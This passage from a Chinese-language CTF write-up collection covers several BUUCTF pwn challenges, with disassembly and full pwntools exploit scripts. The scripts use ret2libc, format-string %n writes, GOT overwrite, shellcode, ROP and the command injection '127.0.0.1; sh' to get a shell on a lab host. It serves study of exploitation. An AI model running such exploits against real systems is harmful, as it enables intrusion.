payload += flat(write_plt, main_address, 1, write_got, 4)
io.sendlineafter(b'Correct\n', payload)
write_address = u32(io.recv(4))
log.success('write_address => 0x%x', write_address)
libc = ELF('./libc-2.23.so')
libcbase = write_address - libc.symbols['write']
info('libcbase_address => 0x%x', libcbase)
system_address = libcbase + libc.symbols['system']
log.success('system_address => 0x%x', system_address)
bin_sh_address = libcbase + libc.search(b'/bin/sh').__next__()
log.success('bin_sh_address => 0x%x', bin_sh_address)
io.sendline(b'\x00'.ljust(8, b'\xff'))
payload = b'a'*0xe7 + b'pwn!'
payload += flat(system_address, 0xdeadbeef, bin_sh_address)
io.sendlineafter(b'Correct\n', payload)
io.interactive()
```

![](https://paper.tanyaodan.com/BUUCTF/ogeek2019_babyrop/6.png)

------

### [jarvisoj_fm](https://buuoj.cn/challenges#jarvisoj_fm)

先`file ./jarvisoj_fm`查看文件类型再`checksec --file=./jarvisoj_fm`检查一下文件保护情况。

![](https://paper.tanyaodan.com/BUUCTF/jarvisoj_fm/1.png)

用`IDA Pro 32bit`打开附件`jarvisoj_fm`，按`F5`反汇编源码并查看主函数，可以看到声明了一个可用栈大小为`0x5C`字节的`char`型变量`buf`，`read()`函数从`stdin`中读取了`0x50`字节数据到变量`buf`中。接着出现了一个明显的格式化字符串漏洞，

![](https://paper.tanyaodan.com/BUUCTF/jarvisoj_fm/2.png)

双击变量`x`查看其在内存中的地址信息为`0x804A02C`。

![](https://paper.tanyaodan.com/BUUCTF/jarvisoj_fm/3.png)

第10行的`printf()`其地址信息为`0x80485AD`，我们可以在这里设置一个断点。

![](https://paper.tanyaodan.com/BUUCTF/jarvisoj_fm/4.png)

`run`运行程序，输入多个`a`字符。

![](https://paper.tanyaodan.com/BUUCTF/jarvisoj_fm/5.png)

`x/16wx $esp`的意思是以`16`进制查看`$esp`寄存器的参数信息，`a`的`ACSII`码的`16`进制是`0x61`，我们可以看到赋值参数在第`11`位。接着我们利用`x`的地址配合上`%11$n`将`x`的值修改为`4`，即可让程序系统调用`/bin/sh`终端从而拿到`flag`。

![](https://paper.tanyaodan.com/BUUCTF/jarvisoj_fm/6.png)

编写`Python`代码即可得到`flag{0516c5fb-3bf9-4ea8-a3ae-db6489a1db76}`。

```python
from pwn import *

io = remote('node4.buuoj.cn', 29158)
x_addr = 0x804A02C
payload = p32(x_addr) + b'%11$n'
io.sendline(payload)
io.interactive()
```

![](https://paper.tanyaodan.com/BUUCTF/jarvisoj_fm/7.png)

------

### [jarvisoj_level1](https://buuoj.cn/challenges#jarvisoj_level1)

先`file ./level1`查看文件类型再`checksec --file=./level1`检查文件保护情况。

```bash
┌──(tyd㉿kali-linux)-[~/ctf/pwn/buuctf]
└─$ file ./level1
./level1: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=7d479bd8046d018bbb3829ab97f6196c0238b344, not stripped

┌──(tyd㉿kali-linux)-[~/ctf/pwn/buuctf]
└─$ checksec --file=./level1
[*] '/home/tyd/ctf/pwn/buuctf/level1'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x8048000)
    RWX:      Has RWX segments
```

用`IDA Pro 32bit`打开附件`level1`，按`F5`反汇编源码并查看主函数。

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  vulnerable_function();
  write(1, "Hello, World!\n", 0xEu);
  return 0;
}
```

双击`vulnerable_function()`函数查看详情，可以看到该函数中有一个`char`型局部变量`buf`，其可用栈大小为`0x88`，但是`read()`函数限制从`stdin`中读入到`buf`的字节大小为`0x100`，显然存在栈溢出漏洞。此外，`printf`函数会直接将变量`buf`的地址泄露出来。

```c
ssize_t vulnerable_function()
{
  char buf[136]; // [esp+0h] [ebp-88h] BYREF
  printf("What's this:%p?\n", buf);
  return read(0, buf, 0x100u);
}
```

我们先截取`printf`函数打印出来的`buf`变量地址，在`buf`地址写入`shellcode`后，利用栈溢出漏洞覆盖`vulnerable_function()`函数返回地址，劫持程序去执行写入的`shellcode`。结果我吐了，本地能打通，靶机打不通。

```python
from pwn import *

context(arch='i386', os='linux', log_level='debug')
io = process('./level1')
# io = remote('node4.buuoj.cn', 25155)
io.recvuntil(b"What's this:")
buf_addr = int(io.recv()[2:-2], 16)
log.info('buf_addr: %#x', buf_addr)
shellcode = asm(shellcraft.sh())
payload = shellcode + b'a' * (0x88+0x4-len(shellcode)) + p32(buf_addr)
io.sendline(payload)
io.interactive()
```

`DynELF`函数能通过已知函数迅速查找`libc`库，并不需要我们知道`libc`文件的版本，也不像使用`LibcSearcher`那样需要选择`libc`的版本。`DynELF`函数的使用前提是程序中存在可以泄露libc信息的漏洞，并且漏洞可以被反复触发。我们利用`DynELF`函数泄露出`system`函数的地址后，还需要知道`/bin/sh`的地址，可以利用`read`函数把`/bin/sh`读入到程序的`.bss`段中，然后通过`system`函数调用即可得到靶机的`shell`。编写`Python`代码求解可得`flag{24430808-9b8d-4a29-bd1e-e3b9df054dfb}`。

```python
from pwn import *

context(arch='i386', os='linux', log_level='debug')
io = remote('node4.buuoj.cn', 25155)
elf = ELF('./level1')
main_addr = elf.symbols['main']
write_plt = elf.plt['write']
read_plt = elf.plt['read']
bss_addr = elf.bss()

def leak(address):
    payload = b'a'*(0x88+0x4) + p32(write_plt) + p32(main_addr) + p32(1) + p32(address) + p32(4)
    io.sendline(payload)
    leaked = io.recv(4)
    log.info("[%#x] => %s = %s" % (address, repr(leaked), hex(u32(leaked))))
    return leaked


libc = DynELF(leak, elf=elf)
system_addr = libc.lookup('system', 'libc')
log.success('system_address => %#x' % system_addr)
payload = b'a'*(0x88+0x4) + p32(read_plt) + p32(main_addr) + p32(0) + p32(bss_addr) + p32(8)
io.send(payload)
io.send('/bin/sh\x00')
payload = b'a'*(0x88+0x4) + p32(system_addr) + p32(main_addr) + p32(bss_addr)
io.sendline(payload)
io.interactive()
```

------

### [jarvisoj_level2](https://buuoj.cn/challenges#jarvisoj_level2)

先`file ./level2`查看文件类型再`checksec --file=./level2`检查文件保护情况。

```bash
┌──(tyd㉿kali-linux)-[~/ctf/pwn/buuctf]
└─$ file ./level2    
./level2: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=a70b92e1fe190db1189ccad3b6ecd7bb7b4dd9c0, not stripped

┌──(tyd㉿kali-linux)-[~/ctf/pwn/buuctf]
└─$ checksec --file=./level2    
[*] '/home/tyd/ctf/pwn/buuctf/level2'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

用`IDA Pro 32bit`打开附件`level2`，按`F5`反汇编源码并查看主函数。

```bash
int __cdecl main(int argc, const char **argv, const char **envp)
{
  vulnerable_function();
  system("echo 'Hello World!'");
  return 0;
}
```

双击`vulnerable_function()`函数查看详情，可以看到该函数中有一个`char`型局部变量`buf`，其可用栈大小为`0x88`，但是`read()`函数限制从`stdin`中读入到`buf`的字节大小为`0x100`，显然存在栈溢出漏洞。

```c
ssize_t vulnerable_function()
{
  char buf[136]; // [esp+0h] [ebp-88h] BYREF

  system("echo Input:");
  return read(0, buf, 0x100u);
}
```

双击`buf`变量查看其在函数栈中的情况，构造`payload`时可以先用`0x88`个字节占满`buf`变量，再用`0x4`个字节覆盖到栈帧`r`。

```assembly
-00000088 ; D/A/*   : change type (data/ascii/array)
-00000088 ; N       : rename
-00000088 ; U       : undefine
-00000088 ; Use data definition commands to create local variables and function arguments.
-00000088 ; Two special fields " r" and " s" represent return address and saved registers.
-00000088 ; Frame size: 88; Saved regs: 4; Purge: 0
-00000088 ;
-00000088
-00000088 buf             db 136 dup(?)
+00000000  s              db 4 dup(?)
+00000004  r              db 4 dup(?)
+00000008
+00000008 ; end of stack variables
```

在`Functions window`中可以看到有个`system()`函数，其地址可以由`elf.symbols['system']`获得。使用`ROPgadget`可得`/bin/sh`的地址为`0x804a024`。

```bash
┌──(tyd㉿kali-linux)-[~/ctf/pwn/buuctf]
└─$ ROPgadget --binary ./level2 --string "/bin/sh"    
Strings information
============================================================
0x : /bin/sh
```

编写`Python`代码求解，得到`flag{f0506726-1ac9-446a-8852-717784d3975d}`。

```python
from pwn import *

io = remote('node4.buuoj.cn', 28530)
elf = ELF('./level2')
system_addr = elf.symbols['system']
bin_sh_addr = 0x804a024 # ROPgadget --binary ./level2 --string "/bin/sh"
payload = b'a'*(0x88+0x4) + p32(system_addr) + p32(0) + p32(bin_sh_addr)
io.sendlineafter(b'Input:\n', payload)
io.interactive()
```

------

### [jarvisoj_level2_x64](https://buuoj.cn/challenges#jarvisoj_level2_x64)

先`file ./level2_x64`查看文件类型再`checksec --file=./level2_x64`检查一下文件保护情况。

 ![](https://paper.tanyaodan.com/BUUCTF/jarvisoj_level2_x64/1.png)

用`IDA Pro 64bit`打开附件`level2_x64`，可以看到主函数的汇编语言代码如下，先是调用了一个名为`vulnerable_function()`的函数，然后系统调用`echo`语句输出了`Hello World!`。

![](https://paper.tanyaodan.com/BUUCTF/jarvisoj_level2_x64/2.png)

按`F5`进行反汇编后，可以看到`main()`函数的`C`语言代码如下：

![](https://paper.tanyaodan.com/BUUCTF/jarvisoj_level2_x64/3.png)

双击`vulnerable_function()`函数查看详情，可以看到该函数中有一个`char`型局部变量`buf`，其可用栈大小为`0x80`，但是`read()`函数限制从`stdin`中读入到`buf`的字节大小为`0x200`，显然存在栈溢出漏洞。

![](https://paper.tanyaodan.com/BUUCTF/jarvisoj_level2_x64/4.png)

双击`buf`变量查看其在函数栈中的情况，构造`payload`时可以先用`0x80`个字节占满`buf`变量，再用`0x8`个字节覆盖到栈帧`r`。

![](https://paper.tanyaodan.com/BUUCTF/jarvisoj_level2_x64/5.png)

在`Functions window`中可以看到有个`system()`函数，其地址为`0x4004C0`。

![](https://paper.tanyaodan.com/BUUCTF/jarvisoj_level2_x64/6.png)

使用`ROPgadget`可以查看到`/bin/sh`的地址为`0x600A90`。

```bash
ROPgadget --binary ./level2_x64 --string "/bin/sh"
```

![](https://paper.tanyaodan.com/BUUCTF/jarvisoj_level2_x64/7.png)

`X86_64`架构的函数参数分别保存在`RDI`、`RSI`、`RDX`、`RCX`、`R8`、`R9`，剩下的参数从右往左依次入栈。因此该程序函数调用的第一个参数由`rdi`寄存器传递，使用`ROPgadget`可以查看到`pop rdi`的地址为`0x4006B3`。

![](https://paper.tanyaodan.com/BUUCTF/jarvisoj_level2_x64/8.png)

编写 `Python`代码即可得到`flag{32d6e6d5-6d67-4486-b72b-5351bcfc4cc8}`。

```python
from pwn import *

context(arch='amd64', os='linux', log_level='debug')
io = remote('node4.buuoj.cn', 27561)
e = ELF('./level2_x64')
system_address = e.symbols['system'] # 0x4004C0
bin_sh_address = 0x600A90 # ROPgadget --binary ./level2_x64 --string "/bin/sh"
pop_rdi = 0x4006B3 # ROPgadget --binary ./level2_x64 --only "pop|ret"
payload = b'a'*0x80 + b'fuckpwn!'
payload += p64(pop_rdi) + p64(bin_sh_address) + p64(system_address)
io.sendlineafter(b'Input:\n', payload)
io.interactive()
```

![](https://paper.tanyaodan.com/BUUCTF/jarvisoj_level2_x64/9.png)

------

### [bjdctf_2020_router](https://buuoj.cn/challenges#bjdctf_2020_router)

先`file ./bjdctf_2020_router  `查看文件类型，再`checksec --file=./bjdctf_2020_router  `检查一下文件保护情况。

```bash
┌──(tyd㉿kali-linux)-[~/ctf/pwn/pwnthebox]
└─$ file ./bjdctf_2020_router       
./bjdctf_2020_router: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=41f17252e18bfaccd3440389de0dd5697148c91f, not stripped
                                                                                                    
┌──(tyd㉿kali-linux)-[~/ctf/pwn/pwnthebox]
└─$ checksec --file=./bjdctf_2020_router       
[*] '/home/tyd/ctf/pwn/pwnthebox/bjdctf_2020_router'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

用`IDA Pro 64bit`打开`./bjdctf_2020_router`后按`F5`反汇编源码并查看主函数。输入`1`是`ping`，并且`1`是直接`system()`系统调用输出的字符串，我们可以在此拼接上`sh`获得靶机`shell`权限。

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  int v4; // [rsp+Ch] [rbp-74h] BYREF
  char buf[16]; // [rsp+10h] [rbp-70h] BYREF
  char dest[8]; // [rsp+20h] [rbp-60h] BYREF
  __int64 v7; // [rsp+28h] [rbp-58h]
  int v8; // [rsp+30h] [rbp-50h]
  char v9; // [rsp+34h] [rbp-4Ch]
  char v10[56]; // [rsp+40h] [rbp-40h] BYREF
  unsigned __int64 v11; // [rsp+78h] [rbp-8h]

  v11 = __readfsqword(0x28u);
  setvbuf(stdout, 0LL, 2, 0LL);
  setvbuf(stdin, 0LL, 1, 0LL);
  *(_QWORD *)dest = 0x20676E6970LL;
  v7 = 0LL;
  v8 = 0;
  v9 = 0;
  v4 = 0;
  puts("Welcome to BJDCTF router test program! ");
  while ( 1 )
  {
    menu();
    puts("Please input u choose:");
    v4 = 0;
    __isoc99_scanf("%d", &v4);
    switch ( v4 )
    {
      case 1:
        puts("Please input the ip address:");
        read(0, buf, 0x10uLL);
        strcat(dest, buf);
        system(dest);
        puts("done!");
        break;
      case 2:
        puts("bibibibbibibib~~~");
        sleep(3u);
        puts("ziziizzizi~~~");
        sleep(3u);
        puts("something wrong!");
        puts("Test done!");
        break;
      case 3:
        puts("Please input what u want to say");
        puts("Your suggest will help us to do better!");
        read(0, v10, 0x3AuLL);
        printf("Dear ctfer,your suggest is :%s", v10);
        break;
      case 4:
        puts("Hey guys,u think too much!");
        break;
      case 5:
        puts("Good Bye!");
        exit(-1);
      default:
        puts("Functional development!");
        break;
    }
  }
}
```

编写`Python`代码解得`flag{d8dc77b9-ebba-4da1-b459-2f23fd1fc1bc}`，提交即可。

```python
from pwn import *

io = remote('node4.buuoj.cn', 29833)
io.sendlineafter('Please input u choose:', b'1')
io.sendlineafter('Please input the ip address:', b'127.0.0.1; sh')
io.interactive()
```

------

### ♥ [[第五空间2019 决赛]PWN5](https://buuoj.cn/challenges#[%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B42019%20%E5%86%B3%E8%B5%9B]PWN5)

先`file ./pwn  `查看文件类型，再`checksec --file=./pwn  `检查文件保护情况。

```bash
┌──(tyd㉿kali-linux)-[~/ctf/pwn/buuctf]
└─$ file ./pwn           
./pwn: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=6a8aa744920dda62e84d44fcc440c05f31c4c23d, stripped

┌──(tyd㉿kali-linux)-[~/ctf/pwn/buuctf]
└─$ checksec --file=./pwn
[*] '/home/tyd/ctf/pwn/buuctf/pwn'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

用`IDA Pro 32bit`打开`pwn`后按`F5`反汇编源码并查看主函数。程序首先生成一个随机值并读取到在`.bss`段存储的`dword_804C044`变量中，然后将用户输入读取到`buf`变量中并进行输出，`buf`变量长度为`0x70`字节，`read`函数读取时限制的输入为`0x63`字节，并不存在栈溢出漏洞，但是`printf`函数存在格式化字符串漏洞。接着将用户的下个输入读取到`nptr`变量中，如果`nptr`变量转换成整型后的数值，和`.bss:0804C044`字段中`dword_804C044`变量保存的随机值相等，即可获取到靶机的`shell`权限。

```c
int __cdecl main(int a1)
{
  unsigned int v1; // eax
  int result; // eax
  int fd; // [esp+0h] [ebp-84h]
  char nptr[16]; // [esp+4h] [ebp-80h] BYREF
  char buf[100]; // [esp+14h] [ebp-70h] BYREF
  unsigned int v6; // [esp+78h] [ebp-Ch]
  int *v7; // [esp+7Ch] [ebp-8h]

  v7 = &a1;
  v6 = __readgsdword(0x14u);
  setvbuf(stdout, 0, 2, 0);
  v1 = time(0);
  srand(v1);
  fd = open("/dev/urandom", 0);
  read(fd, &dword_804C044, 4u);
  printf("your name:");
  read(0, buf, 0x63u);
  printf("Hello,");
  printf(buf);
  printf("your passwd:");
  read(0, nptr, 0xFu);
  if ( atoi(nptr) == dword_804C044 )
  {
    puts("ok!!");
    system("/bin/sh");
  }
  else
  {
    puts("fail");
  }
  result = 0;
  if ( __readgsdword(0x14u) != v6 )
    sub_80493D0();
  return result;
}
```

使用`gdb ./pwn`对程序进行调试，这里我用的是`pwndbg`，在`printf`处设置断点`b printf`，`run`运行程序后使用`stack 20`查看栈，可以得知格式化字符串的偏移量是`10`。

```bash
pwndbg> b printf
Breakpoint 1 at 0x8049040
pwndbg> run
Starting program: /home/tyd/ctf/pwn/buuctf/pwn 

Breakpoint 1, __printf (format=0x804a015 "your name:") at printf.c:32
32      printf.c: 没有那个文件或目录.
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
───────────────────────────────────────────────[ REGISTERS ]──────────────────────────────────────────────
 EAX  0x804a015 ◂— 'your name:'
 EBX  0x804c000 —▸ 0x804bf10 ◂— 0x1
 ECX  0x804c044 ◂— 0xf2df338f
 EDX  0x4
 EDI  0x80490e0 ◂— xor    ebp, ebp
 ESI  0x1
 EBP  0xffffd108 ◂— 0x0
 ESP  0xffffd06c —▸ 0x804928d ◂— add    esp, 0x10
 EIP  0xf7e08f10 (printf) ◂— call   0xf7efa189
────────────────────────────────────────────────[ DISASM ]──────────────────────────────────────────────────
 ► 0xf7e08f10 <printf>       call   __x86.get_pc_thunk.ax                    <__x86.get_pc_thunk.ax>
        arg[0]: 0x804928d ◂— add    esp, 0x10
        arg[1]: 0x804a015 ◂— 'your name:'
        arg[2]: 0x804c044 ◂— 0xf2df338f
        arg[3]: 0x4
 
   0xf7e08f15 <printf+5>     add    eax, 0x19a0df
   0xf7e08f1a <printf+10>    sub    esp, 0xc
   0xf7e08f1d <printf+13>    lea    edx, [esp + 0x14]
   0xf7e08f21 <printf+17>    push   0
   0xf7e08f23 <printf+19>    push   edx
   0xf7e08f24 <printf+20>    push   dword ptr [esp + 0x18]
   0xf7e08f28 <printf+24>    mov    eax, dword ptr [eax - 0x60]
   0xf7e08f2e <printf+30>    push   dword ptr [eax]
   0xf7e08f30 <printf+32>    call   __vfprintf_internal                    <__vfprintf_internal>
 
   0xf7e08f35 <printf+37>    add    esp, 0x1c
───────────────────────────────────────────────[ STACK ]────────────────────────────────────────────────────
00:0000│ esp 0xffffd06c —▸ 0x804928d ◂— add    esp, 0x10
01:0004│     0xffffd070 —▸ 0x804a015 ◂— 'your name:'
02:0008│     0xffffd074 —▸ 0x804c044 ◂— 0xf2df338f
03:000c│     0xffffd078 ◂— 0x4
04:0010│     0xffffd07c ◂— 0x0
05:0014│     0xffffd080 —▸ 0xf7ffdb30 —▸ 0xf7fc33f0 —▸ 0xf7ffd9d0 ◂— 0x0
06:0018│     0xffffd084 ◂— 0x3
07:001c│     0xffffd088 —▸ 0xf7fc3420 —▸ 0x804837f ◂— 'GLIBC_2.0'
──────────────────────────────────────────────[ BACKTRACE ]─────────────────────────────────────────────────
 ► f 0 0xf7e08f10 printf
   f 1 0x804928d
   f 2 0xf7dd3905 __libc_start_main+229
   f 3 0x8049112
────────────────────────────────────────────────────────────────────────────────────────────────────────────
pwndbg> c
Continuing.
your name:AAAA   

Breakpoint 1, __printf (format=0x804a020 "Hello,") at printf.c:32
32      in printf.c
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
───────────────────────────────────────────────[ REGISTERS ]────────────────────────────────────────────────
*EAX  0x804a020 ◂— 'Hello,'
 EBX  0x804c000 —▸ 0x804bf10 ◂— 0x1
*ECX  0xffffd098 ◂— 'AAAA\n'
*EDX  0x63
 EDI  0x80490e0 ◂— xor    ebp, ebp
 ESI  0x1
 EBP  0xffffd108 ◂— 0x0
 ESP  0xffffd06c —▸ 0x80492b2 ◂— add    esp, 0x10
 EIP  0xf7e08f10 (printf) ◂— call   0xf7efa189
───────────────────────────────────────────────[ DISASM ]───────────────────────────────────────────────────
 ► 0xf7e08f10 <printf>       call   __x86.get_pc_thunk.ax                    <__x86.get_pc_thunk.ax>
        arg[0]: 0x80492b2 ◂— add    esp, 0x10
        arg[1]: 0x804a020 ◂— 'Hello,'
        arg[2]: 0xffffd098 ◂— 'AAAA\n'
        arg[3]: 0x63
 
   0xf7e08f15 <printf+5>     add    eax, 0x19a0df
   0xf7e08f1a <printf+10>    sub    esp, 0xc
   0xf7e08f1d <printf+13>    lea    edx, [esp + 0x14]
   0xf7e08f21 <printf+17>    push   0
   0xf7e08f23 <printf+19>    push   edx
   0xf7e08f24 <printf+20>    push   dword ptr [esp + 0x18]
   0xf7e08f28 <printf+24>    mov    eax, dword ptr [eax - 0x60]
   0xf7e08f2e <printf+30>    push   dword ptr [eax]
   0xf7e08f30 <printf+32>    call   __vfprintf_internal                    <__vfprintf_internal>
 
   0xf7e08f35 <printf+37>    add    esp, 0x1c
────────────────────────────────────────────────[ STACK ]───────────────────────────────────────────────────
00:0000│ esp 0xffffd06c —▸ 0x80492b2 ◂— add    esp, 0x10
01:0004│     0xffffd070 —▸ 0x804a020 ◂— 'Hello,'
02:0008│     0xffffd074 —▸ 0xffffd098 ◂— 'AAAA\n'
03:000c│     0xffffd078 ◂— 0x63 /* 'c' */
04:0010│     0xffffd07c ◂— 0x0
05:0014│     0xffffd080 —▸ 0xf7ffdb30 —▸ 0xf7fc33f0 —▸ 0xf7ffd9d0 ◂— 0x0
06:0018│     0xffffd084 ◂— 0x3
07:001c│     0xffffd088 —▸ 0xf7fc3420 —▸ 0x804837f ◂— 'GLIBC_2.0'
────────────────────────────────────────────────[ BACKTRACE ]───────────────────────────────────────────────
 ► f 0 0xf7e08f10 printf
   f 1 0x80492b2
   f 2 0xf7dd3905 __libc_start_main+229
   f 3 0x8049112
────────────────────────────────────────────────────────────────────────────────────────────────────────────
pwndbg> stack 20
00:0000│ esp 0xffffd06c —▸ 0x80492b2 ◂— add    esp, 0x10
01:0004│     0xffffd070 —▸ 0x804a020 ◂— 'Hello,'
02:0008│     0xffffd074 —▸ 0xffffd098 ◂— 'AAAA\n'
03:000c│     0xffffd078 ◂— 0x63 /* 'c' */
04:0010│     0xffffd07c ◂— 0x0
05:0014│     0xffffd080 —▸ 0xf7ffdb30 —▸ 0xf7fc33f0 —▸ 0xf7ffd9d0 ◂— 0x0
06:0018│     0xffffd084 ◂— 0x3
07:001c│     0xffffd088 —▸ 0xf7fc3420 —▸ 0x804837f ◂— 'GLIBC_2.0'
08:0020│     0xffffd08c ◂— 0x1
09:0024│     0xffffd090 ◂— 0x0
0a:0028│     0xffffd094 ◂— 0x1
0b:002c│ ecx 0xffffd098 ◂— 'AAAA\n'
0c:0030│     0xffffd09c ◂— 0xa /* '\n' */
0d:0034│     0xffffd0a0 ◂— 0x0
... ↓        5 skipped
13:004c│     0xffffd0b8 —▸ 0xf7ffcff4 (_GLOBAL_OFFSET_TABLE_) ◂— 0x31f1c
```

知道格式化字符串漏洞的偏移量后，这题有两个解题思路：

- 修改`dword_804C044`字段中的内容，这样能在`if`条件`atoi(nptr) == dword_804C044`为真时，成功执行`system("/bin/sh")`。
- 利用`fmtstr_payload`将`atoi`函数地址修改为`system`函数地址，当输入的`nptr`为`/bin/sh`时，就能在`if`条件中的`atoi(nptr)`处成功执行`system("/bin/sh")`。

第一种解法：利用格式化字符串`%n`的特性修改`dword_804C044`字段中的内容，`bss_addr = 0x804C044`共`4`个字节，我们先把这个地址写到栈偏移量为`10`的地址，然后利用`%10$n`把`0x804C044`的字节长度`4`写入到`%10$n`处指针所指的地址`0x804C044`中去，这样做的话，字段`dword_804C044`中的内容就修改成功了，最后输入的`nptr`为`4`时就能使`if`条件`atoi(nptr) == dword_804C044`为真，从而执行`system("/bin/sh")`获取到靶机的`shell`权限，输入`cat flag`可以得到`flag{d1aa727e-1027-4f25-a218-060c904ba5ce}`。

```python
from pwn import *

context(arch='i386', os='linux', log_level='debug')
io = remote('node4.buuoj.cn', 29582)
bss_addr = 0x804C044
payload = p32(bss_addr) + b'%10$n'
io.sendline(payload)
io.sendline(b'4')
io.interactive()
```

第二种解法：在`Functions window`中看到有`system`函数，我们可以利用格式化字符串漏洞将`atoi`函数篡改为`system`函数，当用户在`"your passwd:"`后输入`/bin/sh`时，程序原来的`atoi(nptr)`就变成了`system("/bin/sh")`，从而获取到靶机的`shell`权限，输入`cat flag`可以得到`flag{d1aa727e-1027-4f25-a218-060c904ba5ce}`。

```python
from pwn import *

context(arch='i386', os='linux', log_level='debug')
io = remote('node4.buuoj.cn', 29582)
e = ELF('./pwn')
atoi_got = e.got['atoi']
system_plt = e.plt['system']
payload = fmtstr_payload(10, {atoi_got: system_plt})
io.sendline(payload)
io.sendline(b'/bin/sh\x00')
io.interactive()
```

------

### [pwnable_orw](https://buuoj.cn/challenges#pwnable_orw)

先`file ./orw  `查看文件类型，再`checksec --file=./orw  `检查文件保护情况。

```bash
┌──(tyd㉿kali-linux)-[~/ctf/pwn/buuctf]
└─$ file ./orw
./orw: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=e60ecccd9d01c8217387e8b77e9261a1f36b5030, not stripped

┌──(tyd㉿kali-linux)-[~/ctf/pwn/buuctf]
└─$ checksec --file=./orw
[*] '/home/tyd/ctf/pwn/buuctf/orw'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX disabled
    PIE:      No PIE (0x8048000)
    RWX:      Has RWX segments
```

用`IDA Pro 32bit`打开`orw`后按`F5`反汇编源码并查看主函数。可以看到英语病句`"Give my your shellcode:"`，应该是`"me"`才对。问题不大，`read()`函数读取了`0xC8`字节的`shellcode`，并进行执行。

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  orw_seccomp();
  printf("Give my your shellcode:");
  read(0, &shellcode, 0xC8u);
  ((void (*)(void))shellcode)();
  return 0;
}
```

直接调用`asm(shellcraft.sh())`尝试写入`shellcode`失败。

```python
from pwn import *

context(arch='i386', os='linux', log_level='debug')
io = remote('node4.buuoj.cn', 29109)
shellcraft = asm(shellcraft.sh())
io.recvline(b'Give my your shellcode:')
io.sendline(shellcraft)
io.interactive()
```

审计`orw_seccomp()`函数，源码如下：

```c
unsigned int orw_seccomp()
{
  __int16 v1; // [esp+4h] [ebp-84h] BYREF
  char *v2; // [esp+8h] [ebp-80h]
  char v3[96]; // [esp+Ch] [ebp-7Ch] BYREF
  unsigned int v4; // [esp+6Ch] [ebp-1Ch]

  v4 = __readgsdword(0x14u);
  qmemcpy(v3, &unk_8048640, sizeof(v3));
  v1 = 12;
  v2 = v3;
  prctl(38, 1, 0, 0, 0);
  prctl(22, 2, &v1);
  return __readgsdword(0x14u) ^ v4;
}
```

`prctl(38, 1, 0, 0, 0);`表示禁止提权，比如`system`和`onegadget`都不能用了。`prctl(22, 2, &v1);`限制了能执行系统调用的函数。`seccomp`是`Linux`系统的一种安全机制，主要功能是限制直接通过`syscall`去调用某些系统函数。我们可以用`seccomp-tools`去分析程序的`seccomp`状态。

```bash
sudo gem install seccomp-tools
```

通过`seccomp-tools`发现可以使用`open`，`read`，`write`这三个函数。

```bash
┌──(tyd㉿kali-linux)-[~/ctf/pwn/buuctf]
└─$ seccomp-tools dump ./orw
 line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000004  A = arch
 0001: 0x15 0x00 0x09 0x40000003  if (A != ARCH_I386) goto 0011
 0002: 0x20 0x00 0x00 0x00000000  A = sys_number
 0003: 0x15 0x07 0x00 0x000000ad  if (A == rt_sigreturn) goto 0011
 0004: 0x15 0x06 0x00 0x00000077  if (A == sigreturn) goto 0011
 0005: 0x15 0x05 0x00 0x000000fc  if (A == exit_group) goto 0011
 0006: 0x15 0x04 0x00 0x00000001  if (A == exit) goto 0011
 0007: 0x15 0x03 0x00 0x00000005  if (A == open) goto 0011
 0008: 0x15 0x02 0x00 0x00000003  if (A == read) goto 0011
 0009: 0x15 0x01 0x00 0x00000004  if (A == write) goto 0011
 0010: 0x06 0x00 0x00 0x00050026  return ERRNO(38)
 0011: 0x06 0x00 0x00 0x7fff0000  return ALLOW
```

返回主函数，双击`shellcode`变量跳转到`.bss`段，`shellcode`直接写入到起始地址为`0x804A060`的`.bss`段。

```assembly
.bss:0804A060                 public shellcode
.bss:0804A060 shellcode       db    ? ;               ; CODE XREF: main+42↑p
......
.bss:0804A127 _bss            ends
```

`open`打开`flag`文件，`read`读取`flag`中的文件到`esp`寄存器中，`write`将`esp`中`flag`文件内容写入到标准输出中进行输出显示。编写`Python`代码连接`node4.buuoj.cn`的监听端口`29109`，发送`shellcode`可得`flag{11d4fea3-05ec-4f32-b5ad-d51908da309f}`，提交即可。

```python
from pwn import *

context(arch='i386', os='linux', log_level='debug')
io = remote('node4.buuoj.cn', 29109)
bss_addr = 0x804A060
shellcode = shellcraft.open('flag')
shellcode += shellcraft.read('eax', 'esp', 0x100)
shellcode += shellcraft.write(1, 'esp', 0x100)
shellcode += shellcraft.exit(0)
io.sendline(asm(shellcode))
io.interactive()
```

------

### [wustctf2020_getshell](https://buuoj.cn/challenges#wustctf2020_getshell)

先`file ./wustctf2020_getshell`查看文件类型再`checksec --file=./wustctf2020_getshell`检查了一下文件保护情况。

使用`IDA pro 32bit`打开附件`wustctf2020_getshell`，按`F5`反汇编源码并查看主函数。

```c
